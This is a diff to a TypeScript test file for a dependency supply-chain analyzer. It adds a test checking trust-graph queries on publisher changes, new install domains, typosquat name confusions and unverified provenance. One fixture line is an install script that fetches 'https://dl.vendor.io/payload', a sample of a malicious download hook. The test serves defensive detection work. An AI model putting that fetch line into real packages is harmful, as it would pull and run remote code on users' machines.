@@ -9,8 +9,12 @@ import { compareSnapshots } from '../../src/history/delta.js';
 import {
   GraphIndex,
   assetsBoundToCommit,
+  dependenciesWithNewInstallDomain,
+  dependenciesWithPublisherChange,
   dependenciesPublishedBy,
   domainsIntroducedAfter,
+  dependencyArtifactsBoundToSource,
+  possibleNameConfusions,
   publishTimes,
   versionsWithoutVerifiedProvenance,
 } from '../../src/graph/query.js';
@@ -260,6 +264,106 @@ describe('trust graph: dependency registry, trust roots and domains', () => {
 });
 
 describe('trust graph queries', () => {
+  it('every query agrees with independent report-state computations, including empty and invalid cases', async () => {
+    const report = await analyze(
+      spec({ swap: true, script: "require('https').get('https://dl.vendor.io/payload');\n" }),
+    );
+    const withSignals = JSON.parse(JSON.stringify(report)) as Report;
+    withSignals.dependency_artifacts.artifacts = [
+      {
+        registry: 'npm',
+        package: 'colors',
+        version: '1.4.0',
+        url: null,
+        state: 'verified',
+        entries: 1,
+        total_size: 1,
+        hooks: [],
+        domains: ['example.invalid'],
+        mismatches: [],
+        reason: null,
+        evidence: ['artifact:colors'],
+      },
+    ];
+    withSignals.name_intelligence.signals = [
+      {
+        target: 'colors',
+        candidate: 'colour',
+        ecosystem: 'npm',
+        signals: ['edit_distance'],
+        distance: 1,
+        suppressed: false,
+        suppression_reason: null,
+        evidence: ['name:colors'],
+      },
+    ];
+    const idx = new GraphIndex(buildTrustGraph(withSignals));
+    const expectedPublisher = withSignals.dependency_registry_intel.packages
+      .filter((p) => p.status === 'ok' || p.status === 'partial')
+      .filter((p) => p.versions.some((v) => v.publisher?.name.toLowerCase() === 'mallory'))
+      .map((p) => p.name)
+      .sort();
+    expect(dependenciesPublishedBy(idx, 'mallory').map((x) => x.dependency)).toEqual(
+      expectedPublisher,
+    );
+    expect(dependenciesPublishedBy(idx, 'nobody')).toEqual([]);
+    expect(publishTimes(idx, 'nobody')).toEqual([]);
+    expect(dependenciesWithPublisherChange(idx)).toEqual(
+      withSignals.dependency_registry_intel.events
+        .filter((e) => e.type === 'dependency_publisher_changed')
+        .map((e) => e.package)
+        .filter((x, i, a) => a.indexOf(x) === i)
+        .sort(),
+    );
+    expect(dependenciesWithNewInstallDomain(idx)).toEqual(
+      withSignals.dependency_artifacts.artifacts
+        .filter((a) => a.domains.length > 0)
+        .map((a) => `${a.package}@${a.version}`)
+        .sort(),
+    );
+    expect(possibleNameConfusions(idx)).toEqual(
+      withSignals.name_intelligence.signals
+        .filter((s) => !s.suppressed)
+        .slice(0, 200)
+        .map((s) => `${s.target} ~ ${s.candidate}`)
+        .sort(),
+    );
+    expect(dependencyArtifactsBoundToSource(idx)).toEqual(
+      withSignals.dependency_artifacts.artifacts
+        .filter((a) => a.evidence.length > 0)
+        .map((a) => `${a.package}@${a.version}`)
+        .sort(),
+    );
+    const unverified = withSignals.dependency_registry_intel.packages
+      .flatMap((p) =>
+        p.versions
+          .slice(0, 3)
+          .filter(
+            (v) =>
+              !['provenance_verified', 'source_binding_verified'].includes(
+                p.attestation_states[v.version] ?? '',
+              ),
+          )
+          .map((v) => ({
+            package: p.name,
+            version: v.version,
+            provenance_reported: v.has_provenance,
+          })),
+      )
+      .sort((a, b) => a.package.localeCompare(b.package) || a.version.localeCompare(b.version));
+    expect(
+      versionsWithoutVerifiedProvenance(idx).map(
+        ({ package: p, version, provenance_reported }) => ({
+          package: p,
+          version,
+          provenance_reported,
+        }),
+      ),
+    ).toEqual(unverified);
+    expect(domainsIntroducedAfter(idx, 'not-a-date')).toEqual([]);
+    expect(assetsBoundToCommit(idx, 'not-a-sha')).toEqual([]);
+  });
+
   it('which dependencies were published by actor X, and when', async () => {
     const g = buildTrustGraph(await analyze(spec({ swap: true })));
     const idx = new GraphIndex(g);
